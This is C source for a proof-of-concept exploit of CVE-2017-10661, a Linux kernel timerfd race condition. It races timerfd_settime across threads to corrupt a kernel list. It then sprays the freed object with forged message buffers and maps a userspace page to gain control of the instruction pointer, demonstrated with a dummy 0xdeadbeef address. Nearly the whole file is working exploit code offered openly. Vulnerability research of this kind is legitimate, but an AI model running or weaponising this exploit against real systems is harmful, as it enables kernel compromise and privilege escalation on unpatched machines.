// A Proof-of-Concept demonstrating ip control for CVE-2017-10661, modified from ww9210's exploit
// author: Lewis_Chen_

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/time.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/mman.h>
#include "libexp.h"

#define CRASH_IP 0xffffffffdeadbeef
#define STRUCT_LEN 192
#define SPRAY_NUM 0x400

struct itimerspec new_t ={
	.it_interval={
		.tv_sec=100,
		.tv_nsec=100
	},
	.it_value={
		.tv_sec=100,
		.tv_nsec=100
	}
};

/******************** Heap Spray ************************/

char spray_buffer[192];
void spray_buffer_init() {
	memset(spray_buffer, 0, 192);
	*(unsigned long*)(spray_buffer + 0x60)=0xfacea100; // timerfd_ctx->wqh.next
	*(unsigned long*)(spray_buffer + 0xa0)=0x1; // timerfd_ctx->might_cancel
}

struct msgbuf {
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msgbuf msg={0x4141414141414141,{0}};
int msqid;

void spray_msg_init() {
	memcpy(msg.mtext, spray_buffer, STRUCT_LEN-1);
}

/******************** The Use Found by FUZE ************************/
void loop()
{
	syscall(__NR_clock_adjtime, 0x0ul, 0x20213f30ul);
	return;
}

/******************** Race ************************/
int fd;
volatile int ready;
void* list_add_thread(void* arg) {
	int cpuid = (int)(long)arg;
	set_cpu(cpuid);

	int ret;

	while(ready == 0);

	int i = 0;
	while(i < 1){

		ret = timerfd_settime(fd, 3, &new_t,NULL);

		if (ret < 0){
			perror("timerfd settime failed !");
		}
		i++;
	}

	return NULL;
}

#define RACE_TIME 8000
#define NUM_THREADS cpu_num * 5
int do_race(){
	pthread_t *th = calloc(sizeof(pthread_t), NUM_THREADS);

	for(int i=0; i<RACE_TIME; i++) {
		fprintf(stderr, "race: %d\n", i);

		// create victim ctx
		fd = timerfd_create(CLOCK_REALTIME, 0);
		if (fd < 0) {
			perror("timerfd craete failed!");
			exit(1);
		}

		// race to add victim ctx to cancel_list
		ready = 0;
		for(long j = 0; j < NUM_THREADS; j++) {
			pthread_create(&th[j], NULL, list_add_thread, (void *)(j % cpu_num));
		}
		ready = 1;

		for(long j = 0; j < NUM_THREADS; j++){
			pthread_join(th[j], NULL);
		}

		// free victim ctx and remove it from cancel_list
		close(fd);
		//usleep(100000);
		usleep(10000);

		// heap spray
		struct msg_spray_t *spray = msg_spray(&msg, sizeof(msg.mtext), SPRAY_NUM);
		loop();
		msg_spray_clean(spray);
	}

	return 0;
}

/******************** User space ************************/

#define userspace_base_to_map 0xfacea000
void mmap_userspace_base(){
	void* userspace_base = mmap((void *)userspace_base_to_map-0x1000,0x1000 * 2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
	if (userspace_base < 0) {
		perror("fail to mmap");
		exit(1);
	}
}

void init_userspace_base() {
	mmap_userspace_base();
	*(unsigned long*)(userspace_base_to_map + 0xf8) = CRASH_IP;
}

void payload_setup(void)
{
	syscall(__NR_mmap, 0x20000000ul, 0xe26000ul, 0x3, 0x32, -1, 0);
	*(uint64_t*)0x20213f30 = (uint64_t)0x101;
	*(uint64_t*)0x20213f38 = (uint64_t)0xfffffffffffffffc;
	*(uint64_t*)0x20213f40 = (uint64_t)0x5;
	*(uint64_t*)0x20213f48 = (uint64_t)0x9;
	*(uint64_t*)0x20213f50 = (uint64_t)0xffffffffffff0000;
	*(uint64_t*)0x20213f58 = (uint64_t)0xffff;
	*(uint64_t*)0x20213f60 = (uint64_t)0x9;
	*(uint64_t*)0x20213f68 = (uint64_t)0x0;
	*(uint64_t*)0x20213f70 = (uint64_t)0x1;
	*(uint64_t*)0x20213f78 = (uint64_t)0xff;
	*(uint64_t*)0x20213f80 = (uint64_t)0x7;
	*(uint64_t*)0x20213f88 = (uint64_t)0x2;
	*(uint64_t*)0x20213f90 = (uint64_t)0x800;
	*(uint64_t*)0x20213f98 = (uint64_t)0xfff;
	*(uint64_t*)0x20213fa0 = (uint64_t)0x101;
	*(uint64_t*)0x20213fa8 = (uint64_t)0x100;
	*(uint64_t*)0x20213fb0 = (uint64_t)0x3;
	*(uint64_t*)0x20213fb8 = (uint64_t)0x7;
	*(uint64_t*)0x20213fc0 = (uint64_t)0x100000000;
	*(uint64_t*)0x20213fc8 = (uint64_t)0x101;
	*(uint64_t*)0x20213fd0 = (uint64_t)0x3f;
	*(uint64_t*)0x20213fd8 = (uint64_t)0x40;
	*(uint64_t*)0x20213fe0 = (uint64_t)0x2;
	*(uint64_t*)0x20213fe8 = (uint64_t)0x6;
	*(uint64_t*)0x20213ff0 = (uint64_t)0x8001;
	*(uint64_t*)0x20213ff8 = (uint64_t)0x1;

	spray_buffer_init();
	spray_msg_init();
	init_userspace_base();
}

void context_setup(void)
{
	// create dump ctx
	int fd_dumb = timerfd_create(CLOCK_REALTIME, 0);
	// add dump ctx to cancel_list
	int ret = timerfd_settime(fd_dumb, 3, &new_t, NULL);
	if (ret < 0) {
		perror("timerfd settime failed !");
		exit(1);
	}
}

int main() {
	context_setup();
	payload_setup();

	// create victim ctx and add victim ctx to cancel_list
	int ret = do_race();
	if( ret < 0){
		puts("race failed!");
		exit(1);
	}

	sleep(5);
	return 0;
}
